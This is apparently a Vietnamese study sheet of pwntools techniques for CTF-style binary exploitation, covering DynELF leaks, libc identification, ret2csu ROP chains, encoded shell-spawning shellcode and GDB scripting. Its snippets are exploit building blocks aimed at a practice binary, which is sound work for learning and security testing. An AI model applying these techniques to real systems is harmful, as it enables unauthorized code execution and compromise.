# advanced — DynELF, libcdb, ret2csu, encoders, gdb-api

Kỹ thuật thực chiến nâng cao. Một số **không verify được trên `bof4`** (static/thiếu điều
kiện) — ghi rõ điều kiện cần tại chỗ.

---

## `DynELF` — resolve symbol KHÔNG cần file libc

**Công dụng:** có **một nguyên thuỷ đọc tuỳ ý** (arbitrary read qua fmt string / oob) → pwntools
tự dò ELF/libc trong bộ nhớ và tìm địa chỉ `system`... mà **không cần biết phiên bản libc**.
**Dạng bài:** leak được bộ nhớ nhưng không có file libc, không leak trực tiếp được hàm cần.

| Tham số `DynELF(leak, ...)` | Ý nghĩa |
|---|---|
| `leak` | hàm `f(addr) -> bytes`: đọc ≥1 byte tại `addr` (bạn tự cài qua lỗ hổng) |
| `pointer` | một con trỏ **đã biết** trỏ vào libc (vd GOT entry đã resolve) |
| `elf` | hoặc đưa ELF để dò từ base của nó |
| `libcdb` | True: tra thêm libc-database cho nhanh |

```python
def leak(addr):
    # ví dụ qua format string: đọc chuỗi tại addr
    p.sendline(f"%7$s||".encode().ljust(8) + p64(addr))  # tuỳ bài
    return p.recvuntil(b"||", drop=True) + b"\x00"

d = DynELF(leak, pointer=exe.got.puts)   # puts GOT đã trỏ vào libc
system = d.lookup('system', 'libc')
binsh  = d.lookup(None, 'libc')          # (thường tự tìm chuỗi khác)
log.success(f"system = {hex(system)}")
```

> `leak` phải **đọc đúng** tại địa chỉ bất kỳ và trả bytes. DynELF gọi nó rất nhiều lần (chậm).

**Bản làm tay:** tự lần `.dynamic`, hash bảng symbol, duyệt `link_map` — hàng trăm dòng.

---

## `libcdb` — nhận diện phiên bản libc từ leak

**Công dụng:** biết **vài byte cuối** (offset) của một số hàm libc leak được → tra ra **đúng file
libc** (tải về), rồi dùng `ELF` bình thường. **Dạng bài:** ret2libc remote, không cho libc.

```python
from pwnlib.libcdb import search_by_symbol_offsets, search_by_build_id

# C1: theo offset 12-bit cuối của vài symbol (phần KHÔNG đổi theo ASLR)
libc_path = search_by_symbol_offsets({'printf': 0xe30, 'puts': 0x420})
libc = ELF(libc_path)

# C2: nếu leak được Build-ID (vd từ .note.gnu.build-id)
libc = ELF(search_by_build_id('d1704d25...'))
```

| Hàm | Dò theo |
|-----|---------|
| `search_by_symbol_offsets({sym: off})` | offset các hàm (hay dùng nhất) |
| `search_by_build_id(hex)` | GNU Build-ID |
| `search_by_md5/sha1/sha256(hex)` | hash file libc |

> Cần mạng (tải libc) trừ khi `offline_only=True` + đã có cache. Tương đương **libc.rip**/
> libc-database nhưng ngay trong script.

---

## `ROP.ret2csu` — gọi hàm nhiều tham số khi thiếu gadget

> **Học sâu cơ chế (2 gadget, mapping, vòng lặp, ràng buộc):** [`../ret2csu.md`](../ret2csu.md).
> Mục này chỉ là tra nhanh API pwntools.

**Công dụng:** dùng **universal gadget** trong `__libc_csu_init` để set `rdi/rsi/rdx` + gọi 1 hàm
khi binary **không có** `pop rdx` v.v. **Dạng bài:** no-PIE, dynamic, thiếu gadget pop.

```python
rop = ROP(exe)
rop.ret2csu(rdi=1, rsi=heap, rdx=0x100, call=exe.got.read)  # read(1, heap, 0x100)
rop.ret2csu(edi=0, rsi=0, rdx=0, call=exe.plt.system)
payload = flat(cyclic(off, n=8), rop.chain())
```

| Tham số | Ý nghĩa |
|---------|---------|
| `edi/rsi/rdx/rbx/rbp/r12..r15` | giá trị nạp qua chuỗi `pop` của csu |
| `call` | địa chỉ hàm/con trỏ để gọi (qua `call [r12+rbx*8]`) |

> Cần có `__libc_csu_init` (binary **dynamic** cổ điển). Binary static hiện đại như `bof4`
> **không có** → `ret2csu` báo thiếu gadget. pwntools tự tìm 2 phần gadget của csu.

> **Cơ chế & 2 giới hạn phải nhớ:** gadget csu kết thúc bằng `call qword [r12+rbx*8]` → tham số
> `call` phải là **con trỏ TỚI hàm** (ô GOT, không phải `plt`/địa chỉ hàm trực tiếp); pwntools
> đặt `rbx=0`, `rbp=1` để qua lệnh `cmp rbx,rbp; jne` rồi `ret`. Và `rdi` nạp qua `mov edi,
> r13d` → **chỉ set được 32-bit thấp** của `rdi` (đủ cho `fd`/số nhỏ; cần địa chỉ 64-bit đầy đủ
> trong `rdi` thì ret2csu không làm được, phải tìm `pop rdi` thật).

**Bản làm tay:** tự nhớ 2 đoạn csu (pop r15..rbx; mov edi/rsi/rdx; call) + padding — rất dễ sai.

---

## `encoders` — né byte xấu / shellcode ASCII

**Công dụng:** biến shellcode để **tránh byte cấm** (`\x00`, `\n`, space...) hoặc **toàn ký tự
in được**. **Dạng bài:** input bị `strcpy`/`scanf %s` (chặn null), lọc chữ-số.

```python
from pwnlib.encoders import encode
sc  = asm(shellcraft.sh())
enc = encode(sc, avoid=b'\x00\x0a\x20')      # tự chọn encoder né null/newline/space

# i386 shellcode TOÀN ASCII in được (qua bộ lọc alnum)
from pwnlib.encoders.i386.ascii_shellcode import ascii_shellcode
asc = ascii_shellcode.encode(asm(shellcraft.i386.linux.sh()))
```

| Hàm | Ý nghĩa |
|-----|---------|
| `encode(raw, avoid=b'...')` | tự chọn encoder loại bỏ byte trong `avoid` |
| `encoders.i386.xor / delta / ascii_shellcode` | encoder cụ thể cho i386 |
| `encoders.amd64.delta` | delta encoder amd64 |

> `encode` có thể ném lỗi nếu không encoder nào né hết được `avoid` cho arch đó.

---

## `gdb.attach(api=True)` — điều khiển GDB bằng Python

**Công dụng:** thay vì gõ gdb tay, **đọc thanh ghi/bộ nhớ, đặt breakpoint, step** ngay trong
script → tự động hoá debug/brute. **Dạng bài:** cần quan sát runtime theo vòng lặp.

```python
p = process(exe.path)
gdb.attach(p, "b *main", api=True)           # api=True -> p.gdb là đối tượng điều khiển
p.gdb.execute("c")
rsp = int(p.gdb.parse_and_eval("$rsp"))      # đọc thanh ghi
mem = p.gdb.selected_inferior().read_memory(rsp, 8).tobytes()
p.gdb.Breakpoint("*0x401234")
p.gdb.continue_and_wait()
```

Liên quan:
```python
gdb.debug_shellcode(asm(shellcraft.sh()))    # chạy shellcode thô dưới gdb
gdb.debug([exe.path, "arg"], gdbscript="c")  # debug kèm đối số
bases = gdb.find_module_addresses("libc")    # base các module khi đang gdb
```

> `api=True` cần GDB có Python (pwndbg/gef OK) và `context.terminal` hợp lệ. Mode remote không
> attach được.

---

## Mẹo nhanh

- Không có file libc, leak được bộ nhớ → **DynELF**. Chỉ leak được vài offset hàm → **libcdb**.
- Thiếu `pop rdx`/gadget, binary dynamic no-PIE → **ret2csu**.
- Input lọc null/alnum → **encoders** (`encode(avoid=...)` hoặc `ascii_shellcode`).
- Brute/quan sát runtime → `gdb.attach(..., api=True)` + `p.gdb.parse_and_eval`.
